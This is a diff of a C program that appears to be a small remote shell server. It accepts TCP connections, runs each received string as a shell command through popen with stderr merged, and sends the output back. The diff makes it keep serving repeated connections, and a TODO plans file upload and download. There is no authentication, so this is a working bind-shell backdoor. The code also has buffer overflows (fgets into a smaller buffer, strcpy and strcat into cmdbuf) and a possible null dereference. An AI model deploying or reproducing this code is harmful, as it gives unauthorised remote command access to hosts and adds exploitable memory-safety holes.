@@ -7,22 +7,27 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#define DEBUG 1
 
 /* TO DO:
- * 1. Redirect STDERR to STDOUT just in case, to send back to client
+ * 1. Redirect STDERR to STDOUT just in case, to send back to client --DONE!!
  * 2. Dont terminate after connection complete
  * 3. Create download and upload commands for file in client
  * 4. figure out a better sleep timer for the termination string
+ * 5. Debugger Mode in preprocessor
  * 
  * Multithreading for each connection <-- may need to rebuild from the ground up
  * 
  */
+ 
+ 
 int main(int argc, char *argv[]){
 	int sockfd, status, new_fd, bytes;
 	struct addrinfo hints, *res;
 	struct sockaddr_storage their_addr;
 	socklen_t addr_size = sizeof(their_addr);
-	char paddr[INET_ADDRSTRLEN], receive[100], cmdln[255], currentuser[99];
+	char paddr[INET_ADDRSTRLEN], receive[100], cmdbuf[100], cmdln[255], currentuser[99];
+	char *ptr;
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_INET;
 	hints.ai_socktype = SOCK_STREAM;
@@ -58,15 +63,15 @@ int main(int argc, char *argv[]){
 		close(sockfd);
 		return -1;
 	}
-	printf("Listening on %s\n", argv[1]);
+	if(DEBUG) printf("Listening on %s\n", argv[1]);
+	while(1){
 	new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
 	if (new_fd == -1) {
 		perror("accept");
 	}
 	
 	inet_ntop(AF_INET, &(((struct sockaddr_in*)&their_addr)->sin_addr), paddr, INET_ADDRSTRLEN);
-	
-	printf("New Connection From: %s\n", paddr);
+	if(DEBUG) printf("New Connection From: %s\n", paddr);
 	
 	if(send(new_fd, currentuser, strlen(currentuser),0)<0) {
 		perror("send");
@@ -78,11 +83,15 @@ int main(int argc, char *argv[]){
 			return -1;
 		}
 		if(bytes==0){
-			printf("Client Disconnect\n");
+			if(DEBUG) printf("Client Disconnect\n");
 			break;
 		}
 		receive[bytes]='\0';
-		FILE *fp = popen(receive,"r");
+		strcpy(cmdbuf, receive);
+		ptr=strchr(cmdbuf, '\n');
+		*ptr='\0';
+		strcat(cmdbuf, " 2>&1");
+		FILE *fp = popen(cmdbuf,"r");
 		while (fgets(cmdln, 4096, fp) != NULL){
 			if(send(new_fd, cmdln, strlen(cmdln), 0)<0){
 				perror("send");
@@ -92,10 +101,12 @@ int main(int argc, char *argv[]){
 		if(send(new_fd, "000xxx000", 9, 0)<0){
 			perror("send");
 		}
-		printf("executed command %s", receive);
+		if(DEBUG) printf("executed command %s", receive);
 		pclose(fp);
 	}
-	close(sockfd);
 	close(new_fd);
+	
+}
+	close(sockfd);
 	return 0;
 }
